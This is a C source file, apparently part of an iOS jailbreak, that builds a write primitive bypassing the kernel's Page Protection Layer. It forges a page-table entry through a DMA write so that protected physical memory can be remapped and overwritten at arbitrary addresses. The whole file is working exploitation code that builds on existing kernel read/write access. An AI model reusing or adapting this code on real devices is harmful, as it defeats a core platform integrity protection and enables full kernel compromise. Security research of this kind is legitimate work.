#include "jailbreak.h"
#include "memory.h"
#include "utils.h"
#include "dma.h"
#include "ppl.h"

#define PPL_PAGE_OF(x)          ((x) & ~(kinfo->pmap_page_size-1ULL))
#define PPL_PAGE_OFFSET(x)      ((x) & (kinfo->pmap_page_size-1ULL))

static void ppl_sync(void) {
    usleep(80);
    __builtin_arm_dsb(15);
    usleep(80);
}

static void ppl_set_page(uint64_t pa) {
    ppl_sync();
    kwrite64(kinfo->patches.pplrw_entry, PPL_PAGE_OF(pa) | 0x60000000000603);
    ppl_sync();
    
    usleep(1000);
    uint64_t cachline = kinfo->patches.pplrw_entry & ~(64-1);
    mach_vm_msync(kinfo->tfp0, cachline, 64, VM_SYNC_SYNCHRONOUS|VM_SYNC_INVALIDATE);
    ppl_sync();
}

void ppl_write_buf(uint64_t pa, void *data, uint32_t size) {
    uint64_t target_page = PPL_PAGE_OF(pa);
    uint64_t target_offset = PPL_PAGE_OFFSET(pa);
    
    ppl_set_page(target_page);
    kwrite_buf(kinfo->patches.pplrw_mapping_va + target_offset, data, size);
    ppl_set_page(kinfo->patches.pplrw_mapping_pa);
}

void ppl_write8(uint64_t pa, uint8_t value) {
    ppl_write_buf(pa, &value, 1);
}

void ppl_write16(uint64_t pa, uint16_t value) {
    ppl_write_buf(pa, &value, 2);
}

void ppl_write32(uint64_t pa, uint32_t value) {
    ppl_write_buf(pa, &value, 4);
}

void ppl_write64(uint64_t pa, uint64_t value) {
    ppl_write_buf(pa, &value, 8);
}

int ppl_init(void) {
    uint64_t entry_va = kalloc_wired(0x4000);
    if (entry_va == 0) return -1;
    
    uint64_t mapping_va = kalloc_wired(0x4000);
    if (mapping_va == 0) return -1;
    
    kwrite64(entry_va, 0x1337414113374141);
    kwrite64(mapping_va, 0x1337414113374141);
    
    uint64_t entry_pa = kvtophys(entry_va);
    if (entry_pa == 0) return -1;
    
    uint64_t mapping_pa = kvtophys(mapping_va);
    if (mapping_pa == 0) return -1;

    uint64_t entry_pte = get_kva_pte(entry_va);
    if (entry_pte == 0) return -1;

    uint64_t mapping_pte = get_kva_pte(mapping_va);
    if (mapping_pte == 0) return -1;
    
    uint64_t mapping_pte_page = PPL_PAGE_OF(mapping_pte);
    uint64_t mapping_pte_offset = PPL_PAGE_OFFSET(mapping_pte);
    
    dma_write64(entry_pte, mapping_pte_page | 0x60000000000603);
    usleep(10000);
    
    uint64_t test_read = kread64(entry_va + mapping_pte_offset) & ARM_TTE_PA_MASK;
    if (test_read != PPL_PAGE_OF(mapping_pa)) return -1;
        
    kinfo->patches.pplrw_entry = entry_va + PPL_PAGE_OFFSET(mapping_pte);
    kinfo->patches.pplrw_mapping_va = mapping_va;
    kinfo->patches.pplrw_mapping_pa = mapping_pa;
    return 0;
}
